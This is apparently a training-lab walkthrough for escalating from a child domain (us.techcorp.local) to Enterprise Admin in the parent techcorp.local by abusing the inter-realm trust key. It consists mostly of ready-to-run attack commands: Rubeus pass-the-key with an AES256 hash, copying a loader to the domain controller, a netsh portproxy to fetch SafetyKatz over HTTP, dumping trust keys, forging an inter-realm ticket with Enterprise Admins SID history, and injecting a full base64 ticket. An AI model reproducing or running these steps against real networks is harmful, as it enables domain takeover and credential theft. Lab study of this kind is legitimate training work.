
Task 

• Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, techcorp.local using the domain trust key.

We need the trust key, which can be retrieved using the DA privileges. Run the below command on the student VM from an elevated shell:

```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


In the new process, run the following commands. Remember to host SafetyKatz on a local web server. Note that we are looking for the [In] key for us.techcorp.local to techcrop.local trust:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
```

```
winrs -r:us-dc cmd
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.139
```

```
echo %Pwn% lsadump::trust
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

![[Pasted image 20250323175714.png]]

Let’s Forge a ticket with SID History of Enterprise Admins. Note that the trust key may be different for your lab and may change over time even in the same lab instance. Run the below command from an elevated shell on the student VM:

```
echo %Pwn% silver
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /ldap /service:krbtgt/US.TECHCORP.LOCAL /rc4:eaf1d75edec06d33d9de31662f5349aa /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /nowrap
```


![[Pasted image 20250323175858.png]]


```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:CIFS/techcorp-dc.TECHCORP.LOCAL /dc:techcorp-dc.TECHCORP.LOCAL /ptt /ticket:doIF0TCCBc2gAwIBBaEDAgEWooIEvzCCBLthggS3MIIEs6ADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBG0wggRpoAMCARehAwIBA6KCBFsEggRX/Pi7ZL7gUVdnYYhG+0jx8LnKyDxQjqsUjfaiFd7Lf3t+g1r5z+W8jYe4bN6NpqXsQ1lzL3IHjCAytiLlH8dQ6BlTkVX27jO1tE4iK5/fNriz0ZpbNvEWSXbsXK2tCteTNi8STFs3WA3Dw9/rAg4nutBeh7PLMgrFo8+BmwG9lWbrR65FyOFhLNN3FCnp7m2Pp9RjU/HFJSw8NdSuCsmcVaqrYOTHkgL4KN9VlGFzvymLhbvZ6gaiJs6v3AmvbUDJmPoRcZut8P94N6PgHdZNwbMpKSAsOQSqUVGEhJN/oNFQN9VNTVnLKQooplQiI4cQjl1l21Lj+ciz6ASp0dJqkM0/8PJin7GzWquL/RyVh9NUnGCuXQjWjV3BiokjSKNHeEtH8yCH9aQZBbgtJMNicdeRFkt63GdePykkSZiPZkI920GQ7AYHqnNseKcCXGTTbLlhh81OSR5WgXgc5+I18qrkrN+oiML+64zLhmO6Bax95pBiFyxYpDT+LkVqD8Sfrw+VMoR5qbRNH6ZRRnC0zZ942Uofv1ruDcPgT7koUmFjohdztoYl48F03pv/Gjfo7Vs+QwdUshdvn1hKist53Ig47N3dzbP9Jneh7I2rcOZok6SDkNpVDc8x1cktWAPySdfs9qbgSqR38qTFADvjha708tY1FlZycTWSLGMG4SJtkpF0qXebYDF0Mc3Wg+vZlJ/OlTEWNFCUDwntWRgUBTeasRIedoRUVn7vlqSP+zZ5mrgcPzgmHtOFeJIYfD+W8jdiuMi3rrd+POhjvhIYJoWKWM04ZhqrOY/5yerYLZ4PDV5J8x+5cptm21INMMwvhCrqR+3snv78lQpqU+ILYAV3jBhBSNBcMSrXgbBTleI/7a1r5+Pf1hwXY4Rg+IGk7Rbjwt+AGNFbajm4woPmlKHOwi8j/SW8yieCyIpxVdn5b1oVOzTFns54dDI95VOmZmMA1R6nBN1YEB5cbgl/ooqTFNlQSRKXsqkyhSUPIido/k2qPBrPu8EGKLo969m73j2366/Kpv5hLwhGUuAygdbfR+O40Wosf38t9GfSJVpMFWnS+Tsu3rBltcK1KRO241lAeru/pewvtv/0OinGHhjP2krqMvir9UdKGV344T35CuOFTKPNHkJemynqr+N9kT6CG75vrrTLNkgp6wMdCP3a1Ol+g4sBJNWbwxEZ2mmAYSDpoQTh1TRwdXle6BxT4rFs5ZH4w22mI1HmXnTi4dF2MW2fEMeTdJgqF4PQerGGW7M5K6Msb8900twSPCxrbnJHiTOJ7xHoXIvhohmeH2uJ1FvuA1fGHqWadfxu5fvVDz0OODp/1j6b2eO7ldvG/OFalXLdN++KLPdbDB01UCq+gT2I8YNkAqD5umqpWu+/ev183AnHOoRROC/9jEElF75wEiH+2AptNFhcNIsRRtm/PH74KDoUJjDSnFCEGfcasNmXe6ANtEra/Mq7XAOE0lwbx1jVnqOB/TCB+qADAgEAooHyBIHvfYHsMIHpoIHmMIHjMIHgoBswGaADAgEXoRIEEBMCST3NtTdTKi97OJ2NiL2hExsRVVMuVEVDSENPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjUwMzIzMDk0NDQxWqURGA8yMDI1MDMyMzA5NDQ0MVqmERgPMjAyNTAzMjMxOTQ0NDFapxEYDzIwMjUwMzMwMDk0NDQxWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
```

```
klist
```

![[Pasted image 20250323175955.png]]

Finally, let's access the filesystem on techcorp-dc. Run the below command from the command prompt where TGS is injected:

```
dir \\techcorp-dc.TECHCORP.LOCAL\c$
```

![[Pasted image 20250323180052.png]]


